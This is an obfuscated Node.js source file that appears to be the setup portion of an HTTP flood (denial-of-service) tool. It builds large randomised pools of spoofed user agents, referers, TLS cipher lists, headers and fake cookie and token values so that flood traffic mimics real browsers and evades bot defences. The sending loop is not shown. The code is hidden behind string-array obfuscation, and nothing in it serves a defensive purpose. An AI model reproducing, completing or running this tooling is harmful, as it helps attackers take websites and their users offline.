const _0x2672b1 = _0x4bd0;
(function (_0x383e5d, _0x637b1c) {
    const _0x4d3d19 = _0x4bd0,
        _0x187852 = _0x383e5d();
    while (!![]) {
        try {
            const _0x2dcac0 = parseInt(_0x4d3d19(0x2aa)) / 0x1 * (parseInt(_0x4d3d19(0x2a1)) / 0x2) + -parseInt(_0x4d3d19(0x248)) / 0x3 * (-parseInt(_0x4d3d19(0x2a7)) / 0x4) + parseInt(_0x4d3d19(0x287)) / 0x5 + parseInt(_0x4d3d19(0x2b9)) / 0x6 + -parseInt(_0x4d3d19(0x297)) / 0x7 * (parseInt(_0x4d3d19(0x34d)) / 0x8) + -parseInt(_0x4d3d19(0x2d5)) / 0x9 + parseInt(_0x4d3d19(0x1fc)) / 0xa * (-parseInt(_0x4d3d19(0x397)) / 0xb);
            if (_0x2dcac0 === _0x637b1c) break;
            else _0x187852['push'](_0x187852['shift']());
        } catch (_0x2dfe2e) {
            _0x187852['push'](_0x187852['shift']());
        }
    }
}(_0x3ee2, 0x44e0d));
const url = require(_0x2672b1(0x29c)),
    fs = require('fs'),
    http2 = require(_0x2672b1(0x243)),
    http = require(_0x2672b1(0x36a)),
    tls = require(_0x2672b1(0x2f2)),
    net = require(_0x2672b1(0x1e6)),
    request = require(_0x2672b1(0x26c)),
    cluster = require(_0x2672b1(0x351)),
    fakeua = require(_0x2672b1(0x1f0)),
    randstr = require('randomstring'),
    crypto = require(_0x2672b1(0x392)),
    currentTime = new Date(),
    httpTime = currentTime[_0x2672b1(0x2d8)](),
    randomString = crypto[_0x2672b1(0x221)](0x14)['toString'](_0x2672b1(0x19f)),
    secretKey = crypto[_0x2672b1(0x221)](0x20);
var ciphe = crypto[_0x2672b1(0x1e7)](_0x2672b1(0x1fa), secretKey, crypto[_0x2672b1(0x221)](0x10));

function _0x4bd0(_0xf10250, _0x2ba777) {
    const _0x3ee27a = _0x3ee2();
    return _0x4bd0 = function (_0x4bd021, _0x6bd49b) {
        _0x4bd021 = _0x4bd021 - 0x19f;
        let _0x10c901 = _0x3ee27a[_0x4bd021];
        return _0x10c901;
    }, _0x4bd0(_0xf10250, _0x2ba777);
}
let encrypted = ciphe[_0x2672b1(0x304)](randomString, _0x2672b1(0x296), _0x2672b1(0x19f));
encrypted += ciphe[_0x2672b1(0x1a0)](_0x2672b1(0x19f));
const cookieValue = encrypted,
    bytes = crypto[_0x2672b1(0x221)](0x10),
    xAuthToken = bytes[_0x2672b1(0x33a)]('hex');
try {
    var colors = require('colors');
} catch (_0x5ddd47) {
    console[_0x2672b1(0x20b)](_0x2672b1(0x226)), execSync('npm install colors'), console[_0x2672b1(0x20b)]('Done.'), process[_0x2672b1(0x2ae)]();
}
const uap = ['POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1', 'POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1', _0x2672b1(0x204), 'Python-urllib/2.5', _0x2672b1(0x25a), 'SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0', _0x2672b1(0x348), 'SearchExpress', _0x2672b1(0x1d0), _0x2672b1(0x343), _0x2672b1(0x362), _0x2672b1(0x398), _0x2672b1(0x364), _0x2672b1(0x24a), 'SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', _0x2672b1(0x1c1), _0x2672b1(0x2f1), _0x2672b1(0x354), 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', _0x2672b1(0x2e9), _0x2672b1(0x267), _0x2672b1(0x38b), 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01', _0x2672b1(0x264), _0x2672b1(0x39c), 'SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0', 'SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', _0x2672b1(0x1c6), 'SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', _0x2672b1(0x209), _0x2672b1(0x301), _0x2672b1(0x377), 'HTC_HD2_T8585 Opera/9.70 (Windows NT 5.1; U; de)', _0x2672b1(0x3a3), 'BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123', _0x2672b1(0x1e8), _0x2672b1(0x2db), 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.70', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36', _0x2672b1(0x2c0), _0x2672b1(0x211), 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45', _0x2672b1(0x369), _0x2672b1(0x2c2), _0x2672b1(0x2c5), _0x2672b1(0x37b), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', _0x2672b1(0x366), 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', _0x2672b1(0x222), _0x2672b1(0x337), _0x2672b1(0x2ab), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', _0x2672b1(0x2cf), _0x2672b1(0x1fd), _0x2672b1(0x1cf), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36', _0x2672b1(0x259)],
    fetch_site = [_0x2672b1(0x1d1), _0x2672b1(0x200), 'cross-site', _0x2672b1(0x36e)],
    type = ['text/plain', 'text/html', 'application/json', _0x2672b1(0x262), _0x2672b1(0x36f), _0x2672b1(0x35a), 'image/jpeg', _0x2672b1(0x1e0), _0x2672b1(0x2fd), _0x2672b1(0x1ba), _0x2672b1(0x2bf), _0x2672b1(0x1d7), _0x2672b1(0x1b1), _0x2672b1(0x1f1), _0x2672b1(0x346), _0x2672b1(0x2b0), _0x2672b1(0x253), _0x2672b1(0x260), 'image/gif', _0x2672b1(0x2b3), 'image/tiff', _0x2672b1(0x254), _0x2672b1(0x31f), _0x2672b1(0x23e), _0x2672b1(0x32d), _0x2672b1(0x255), 'text/csv', 'text/xml', _0x2672b1(0x26b), _0x2672b1(0x372), _0x2672b1(0x335), _0x2672b1(0x1da), _0x2672b1(0x1d4), _0x2672b1(0x1aa), _0x2672b1(0x232), _0x2672b1(0x1c3), _0x2672b1(0x28e), _0x2672b1(0x2a8), _0x2672b1(0x22d), _0x2672b1(0x2b1), _0x2672b1(0x1bc), _0x2672b1(0x231), 'application/x-gzip', _0x2672b1(0x249), 'application/x-rar-compressed', _0x2672b1(0x241)],
    referer = [_0x2672b1(0x39e), _0x2672b1(0x2a5), _0x2672b1(0x2cc), 'https://www.youtube.com', 'https://www.amazon.com', 'https://www.netflix.com', _0x2672b1(0x1c7), _0x2672b1(0x30e), 'https://www.stackoverflow.com', _0x2672b1(0x2ee), _0x2672b1(0x1c9), _0x2672b1(0x224), _0x2672b1(0x2ef), _0x2672b1(0x275), _0x2672b1(0x2da), _0x2672b1(0x1de), 'https://www.msn.com', _0x2672b1(0x283), 'https://www.quora.com', _0x2672b1(0x27e), _0x2672b1(0x1cc), _0x2672b1(0x326), 'https://www.huffingtonpost.com', _0x2672b1(0x1d9), _0x2672b1(0x370), _0x2672b1(0x1b6), _0x2672b1(0x378), _0x2672b1(0x237), _0x2672b1(0x2c6), _0x2672b1(0x298), _0x2672b1(0x2c9), _0x2672b1(0x2bd), _0x2672b1(0x20c), _0x2672b1(0x1c0), 'https://www.nypl.org', _0x2672b1(0x319), _0x2672b1(0x32a), _0x2672b1(0x34a), _0x2672b1(0x24f), _0x2672b1(0x1ee), _0x2672b1(0x3a5), _0x2672b1(0x327), _0x2672b1(0x367), _0x2672b1(0x37f), _0x2672b1(0x263), _0x2672b1(0x38c), _0x2672b1(0x2f5), 'https://www.who.int', _0x2672b1(0x27a), _0x2672b1(0x1f2), 'https://www.imf.org', _0x2672b1(0x371), _0x2672b1(0x368), _0x2672b1(0x2d2), _0x2672b1(0x257), _0x2672b1(0x352), _0x2672b1(0x1dd), _0x2672b1(0x2a0), 'https://www.greenpeace.org', 'https://www.oxfam.org', _0x2672b1(0x2ff), 'https://www.unicef.org', _0x2672b1(0x30b), _0x2672b1(0x2cd), _0x2672b1(0x2da), _0x2672b1(0x39a), _0x2672b1(0x289), _0x2672b1(0x2a9), 'https://www.mysql.com', _0x2672b1(0x201), _0x2672b1(0x310), 'https://www.ruby-lang.org', 'https://www.jquery.com', _0x2672b1(0x2af), _0x2672b1(0x223), _0x2672b1(0x2ca), _0x2672b1(0x384), _0x2672b1(0x227), 'https://www.sass-lang.com', _0x2672b1(0x396), _0x2672b1(0x261), _0x2672b1(0x1bf), 'https://www.chartjs.org', _0x2672b1(0x24e), _0x2672b1(0x2e8), _0x2672b1(0x22f), 'https://www.mapbox.com', _0x2672b1(0x2e8), 'https://www.chartjs.org', _0x2672b1(0x1bf), _0x2672b1(0x261), _0x2672b1(0x396), _0x2672b1(0x273), 'https://www.materializecss.com', _0x2672b1(0x384), _0x2672b1(0x2ca), _0x2672b1(0x223), _0x2672b1(0x2af), _0x2672b1(0x27d), 'https://www.ruby-lang.org', _0x2672b1(0x310), _0x2672b1(0x201), _0x2672b1(0x2f8), _0x2672b1(0x2a9), _0x2672b1(0x289), 'https://www.wikimedia.org', _0x2672b1(0x2da), 'https://www.redcross.org', _0x2672b1(0x30b), _0x2672b1(0x1d6), _0x2672b1(0x2ff), _0x2672b1(0x38e), _0x2672b1(0x245), _0x2672b1(0x2a0), _0x2672b1(0x1dd), _0x2672b1(0x352), 'https://www.nato.int', _0x2672b1(0x2d2), _0x2672b1(0x368), _0x2672b1(0x371), _0x2672b1(0x1f6), _0x2672b1(0x1f2), _0x2672b1(0x27a), 'https://www.who.int', _0x2672b1(0x2f5), _0x2672b1(0x38c), _0x2672b1(0x263), 'https://www.fda.gov', 'https://www.cancer.gov', 'https://www.medlineplus.gov', 'https://www.nih.gov', _0x2672b1(0x1ee), _0x2672b1(0x24f), _0x2672b1(0x34a), _0x2672b1(0x32a), _0x2672b1(0x319), _0x2672b1(0x2fb), _0x2672b1(0x1c0), _0x2672b1(0x20c), 'https://www.colbertnation.com', 'https://www.thedailyshow.com', 'https://www.thedailybeast.com', _0x2672b1(0x2c6), 'https://www.merriam-webster.com', _0x2672b1(0x378), _0x2672b1(0x1b6), _0x2672b1(0x370), 'https://www.washingtonpost.com', _0x2672b1(0x345), _0x2672b1(0x326), 'https://www.bbc.com', _0x2672b1(0x27e), _0x2672b1(0x1f9), _0x2672b1(0x283), _0x2672b1(0x1ed), _0x2672b1(0x1de), 'https://www.wikipedia.org', _0x2672b1(0x275), 'https://www.apple.com', _0x2672b1(0x224), _0x2672b1(0x1c9), _0x2672b1(0x2ee), _0x2672b1(0x1bb), _0x2672b1(0x30e), _0x2672b1(0x1c7), 'https://www.netflix.com', _0x2672b1(0x2e4), 'https://www.youtube.com', _0x2672b1(0x2cc), _0x2672b1(0x2a5), _0x2672b1(0x39e)],
    platform = ['Windows', _0x2672b1(0x34e), 'Macintosh', _0x2672b1(0x312), 'iOS', _0x2672b1(0x295), _0x2672b1(0x39b), _0x2672b1(0x1ff), _0x2672b1(0x1f5), _0x2672b1(0x323), _0x2672b1(0x1e5), _0x2672b1(0x1dc), 'Chromecast', _0x2672b1(0x1ea), _0x2672b1(0x30a)];
cplist = [_0x2672b1(0x25c), _0x2672b1(0x2d9), _0x2672b1(0x22c), _0x2672b1(0x1a7), _0x2672b1(0x1c2), _0x2672b1(0x29b), _0x2672b1(0x25c), _0x2672b1(0x2d9), _0x2672b1(0x22c), _0x2672b1(0x1a7), _0x2672b1(0x1c2), 'TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', _0x2672b1(0x2c7), _0x2672b1(0x256), _0x2672b1(0x228), 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', _0x2672b1(0x1ec), 'ECDHE-ECDSA-AES128-GCM-SHA256', _0x2672b1(0x256), _0x2672b1(0x228), _0x2672b1(0x2dc), _0x2672b1(0x320), 'ECDHE-RSA-AES256-GCM-SHA384', _0x2672b1(0x1b7), _0x2672b1(0x26d), _0x2672b1(0x1be), _0x2672b1(0x294), _0x2672b1(0x2c7), _0x2672b1(0x256), _0x2672b1(0x228), _0x2672b1(0x2dc), _0x2672b1(0x320), 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-SHA256', 'ECDHE-RSA-AES128-SHA256', _0x2672b1(0x1be), _0x2672b1(0x294), _0x2672b1(0x292), _0x2672b1(0x1a1), 'AES128-GCM-SHA256', _0x2672b1(0x33f), 'AES128-SHA', _0x2672b1(0x216), _0x2672b1(0x308), 'AES256-SHA256', _0x2672b1(0x210), _0x2672b1(0x25c), 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', _0x2672b1(0x21d), _0x2672b1(0x26a), 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', _0x2672b1(0x22c), _0x2672b1(0x28a), 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', _0x2672b1(0x324), 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', _0x2672b1(0x22c), _0x2672b1(0x2d9), 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', _0x2672b1(0x365), _0x2672b1(0x25c), _0x2672b1(0x2d9), 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA', _0x2672b1(0x26a), _0x2672b1(0x2d9), _0x2672b1(0x22c), 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', _0x2672b1(0x365), _0x2672b1(0x1fb), _0x2672b1(0x22c), 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', _0x2672b1(0x22c), _0x2672b1(0x276), _0x2672b1(0x324), _0x2672b1(0x365), _0x2672b1(0x26a), ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', _0x2672b1(0x25c), _0x2672b1(0x2d9), 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'];
const accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', _0x2672b1(0x2c1), _0x2672b1(0x214), _0x2672b1(0x34f), _0x2672b1(0x1a6), _0x2672b1(0x313), _0x2672b1(0x1eb), _0x2672b1(0x1af), _0x2672b1(0x1a8), _0x2672b1(0x2e6), _0x2672b1(0x2ed), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml', _0x2672b1(0x1a5), _0x2672b1(0x1df), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', _0x2672b1(0x322), _0x2672b1(0x394), _0x2672b1(0x291), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', _0x2672b1(0x240), 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', _0x2672b1(0x2e5), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', _0x2672b1(0x341), _0x2672b1(0x27c), _0x2672b1(0x2a6), _0x2672b1(0x333), 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'application/javascript, */*;q=0.8', 'text/html, text/plain; q=0.6, */*; q=0.1', _0x2672b1(0x2a3), _0x2672b1(0x236), 'image/*', 'image/webp,image/apng', 'text/html', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', _0x2672b1(0x21e), _0x2672b1(0x380), _0x2672b1(0x27c), _0x2672b1(0x385), _0x2672b1(0x375), _0x2672b1(0x380), _0x2672b1(0x27c), _0x2672b1(0x385), _0x2672b1(0x375), _0x2672b1(0x385), _0x2672b1(0x380), _0x2672b1(0x27c), _0x2672b1(0x2c1), _0x2672b1(0x214), _0x2672b1(0x34f), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml', _0x2672b1(0x313), _0x2672b1(0x1eb), _0x2672b1(0x1af), _0x2672b1(0x1a8), _0x2672b1(0x2e6), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json', _0x2672b1(0x279), _0x2672b1(0x1a5), _0x2672b1(0x1df), _0x2672b1(0x1b8), _0x2672b1(0x322), _0x2672b1(0x394), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv', _0x2672b1(0x28b), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
    lang_header = [_0x2672b1(0x29e), _0x2672b1(0x246), 'en-CA,en;q=0.9', 'en-AU,en;q=0.9', _0x2672b1(0x2b8), _0x2672b1(0x2b4), 'en-IE,en;q=0.9', 'en-IN,en;q=0.9', _0x2672b1(0x1e3), _0x2672b1(0x2ce), 'be-BY,be;q=0.9', _0x2672b1(0x382), 'bn-IN,bn;q=0.9', _0x2672b1(0x39f), 'cs-CZ,cs;q=0.9', 'cy-GB,cy;q=0.9', 'da-DK,da;q=0.9', _0x2672b1(0x2bc), _0x2672b1(0x278), _0x2672b1(0x399), _0x2672b1(0x353), _0x2672b1(0x3a2), _0x2672b1(0x35f), 'fi-FI,fi;q=0.9', _0x2672b1(0x1ca), _0x2672b1(0x218), _0x2672b1(0x329), _0x2672b1(0x1ce), _0x2672b1(0x342), _0x2672b1(0x2e7), _0x2672b1(0x25e), 'hu-HU,hu;q=0.9', 'hy-AM,hy;q=0.9', _0x2672b1(0x28f), _0x2672b1(0x311), _0x2672b1(0x359), _0x2672b1(0x2b2), _0x2672b1(0x2d1), 'kk-KZ,kk;q=0.9', _0x2672b1(0x1b5), _0x2672b1(0x1ab), 'ko-KR,ko;q=0.9', _0x2672b1(0x361), _0x2672b1(0x239), _0x2672b1(0x2d4), _0x2672b1(0x272), 'mk-MK,mk;q=0.9', _0x2672b1(0x2fc), 'mn-MN,mn;q=0.9', _0x2672b1(0x316), _0x2672b1(0x2a2), _0x2672b1(0x24c), _0x2672b1(0x21f), 'nb-NO,nb;q=0.9', _0x2672b1(0x1a3), _0x2672b1(0x20d), _0x2672b1(0x26e), _0x2672b1(0x317), _0x2672b1(0x39d), _0x2672b1(0x21a), _0x2672b1(0x387), _0x2672b1(0x1ae), _0x2672b1(0x23f), _0x2672b1(0x35d), 'si-LK,si;q=0.9', 'sk-SK,sk;q=0.9', _0x2672b1(0x31e), 'sq-AL,sq;q=0.9', _0x2672b1(0x1c4), _0x2672b1(0x32b), 'sv-SE,sv;q=0.9', _0x2672b1(0x2ad), 'ta-IN,ta;q=0.9', _0x2672b1(0x2d7), 'th-TH,th;q=0.9', 'tr-TR,tr;q=0.9', _0x2672b1(0x32c), _0x2672b1(0x379), _0x2672b1(0x265), _0x2672b1(0x347), _0x2672b1(0x35b), _0x2672b1(0x286), _0x2672b1(0x360), 'am-ET,am;q=0.8', _0x2672b1(0x1db), 'az-Cyrl-AZ,az;q=0.8', _0x2672b1(0x1cb), 'bs-Cyrl-BA,bs;q=0.8', _0x2672b1(0x2f3), 'dz-BT,dz;q=0.8', _0x2672b1(0x27f), _0x2672b1(0x38a), _0x2672b1(0x2fe), 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', _0x2672b1(0x220), _0x2672b1(0x1b2), 'hr-BA,hr;q=0.8', _0x2672b1(0x37a), _0x2672b1(0x2cb), _0x2672b1(0x336), _0x2672b1(0x332), _0x2672b1(0x307), 'kkj-CM,kkj;q=0.8', 'kl-GL,kl;q=0.8', _0x2672b1(0x363), 'kok-IN,kok;q=0.8', _0x2672b1(0x31a), _0x2672b1(0x1fe), _0x2672b1(0x24d), _0x2672b1(0x30f), _0x2672b1(0x229), 'ms-BN,ms;q=0.8', _0x2672b1(0x20a), _0x2672b1(0x3a4), _0x2672b1(0x2e3), _0x2672b1(0x36b), 'nso-ZA,nso;q=0.8', 'oc-FR,oc;q=0.8', _0x2672b1(0x35e), _0x2672b1(0x2d6), _0x2672b1(0x32f), 'quz-EC,quz;q=0.8', _0x2672b1(0x373), 'rm-CH,rm;q=0.8', _0x2672b1(0x252), 'sd-Arab-PK,sd;q=0.8', _0x2672b1(0x1e4), 'si-LK,si;q=0.8', _0x2672b1(0x37c), _0x2672b1(0x202), _0x2672b1(0x2e0), _0x2672b1(0x381), 'ti-ER,ti;q=0.8', _0x2672b1(0x293), _0x2672b1(0x2f0), 'tt-RU,tt;q=0.8', _0x2672b1(0x376), _0x2672b1(0x2ba), 've-ZA,ve;q=0.8', 'wo-SN,wo;q=0.8', _0x2672b1(0x282), 'yo-NG,yo;q=0.8', _0x2672b1(0x2a4), _0x2672b1(0x26f)],
    country = ['A1', 'A2', 'O1', 'AD', 'AE', 'AF', 'AG', 'AI', 'AL', 'AM', 'AO', 'AQ', 'AR', 'AS', 'AT', 'AU', 'AW', 'AX', 'AZ', 'BA', 'BB', 'BD', 'BE', 'BF', 'BG', 'BH', 'BI', 'BJ', 'BL', 'BM', 'BN', 'BO', 'BQ', 'BR', 'BS', 'BT', 'BV', 'BW', 'BY', 'BZ', 'CA', 'CC', 'CD', 'CF', 'CG', 'CH', 'CI', 'CK', 'CL', 'CM', 'CN', 'CO', 'CR', 'CU', 'CV', 'CW', 'CX', 'CY', 'CZ', 'DE', 'DJ', 'DK', 'DM', 'DO', 'DZ', 'EC', 'EE', 'EG', 'EH', 'ER', 'ES', 'ET', 'FI', 'FJ', 'FK', 'FM', 'FO', 'FR', 'GA', 'GB', 'GD', 'GE', 'GF', 'GG', 'GH', 'GI', 'GL', 'GM', 'GN', 'GP', 'GQ', 'GR', 'GS', 'GT', 'GU', 'GW', 'GY', 'HK', 'HM', 'HN', 'HR', 'HT', 'HU', 'ID', 'IE', 'IL', 'IM', 'IN', 'IO', 'IQ', 'IR', 'IS', 'IT', 'JE', 'JM', 'JO', 'JP', 'KE', 'KG', 'KH', 'KI', 'KM', 'KN', 'KP', 'KR', 'KW', 'KY', 'KZ', 'LA', 'LB', 'LC', 'LI', 'LK', 'LR', 'LS', 'LT', 'LU', 'LV', 'LY', 'MA', 'MC', 'MD', 'ME', 'MF', 'MG', 'MH', 'MK', 'ML', 'MM', 'MN', 'MO', 'MP', 'MQ', 'MR', 'MS', 'MT', 'MU', 'MV', 'MW', 'MX', 'MY', 'MZ', 'NA', 'NC', 'NE', 'NF', 'NG', 'NI', 'NL', 'NO', 'NP', 'NR', 'NU', 'NZ', 'OM', 'PA', 'PE', 'PF', 'PG', 'PH', 'PK', 'PL', 'PM', 'PN', 'PR', 'PS', 'PT', 'PW', 'PY', 'QA', 'RE', 'RO', 'RS', 'RU', 'RW', 'SA', 'SB', 'SC', 'SD', 'SE', 'SG', 'SH', 'SI', 'SJ', 'SK', 'SL', 'SM', 'SN', 'SO', 'SR', 'SS', 'ST', 'SV', 'SX', 'SY', 'SZ', 'TC', 'TD', 'TF', 'TG', 'TH', 'TJ', 'TK', 'TL', 'TM', 'TN', 'TO', 'TR', 'TT', 'TV', 'TW', 'TZ', 'UA', 'UG', 'UM', 'US', 'UY', 'UZ', 'VA', 'VC', 'VE', 'VG', 'VI', 'VN', 'VU', 'WF', 'WS', 'YE', 'YT', 'ZA', 'ZM', 'ZW'],
    fetch_mode = [_0x2672b1(0x281), 'same-origin', _0x2672b1(0x285), _0x2672b1(0x37e)],
    fetch_dest = [_0x2672b1(0x270), 'sharedworker', 'subresource', _0x2672b1(0x23c), 'worker'];
encoding_header = [_0x2672b1(0x33d), _0x2672b1(0x318), 'deflate, gzip', _0x2672b1(0x271), '*'];
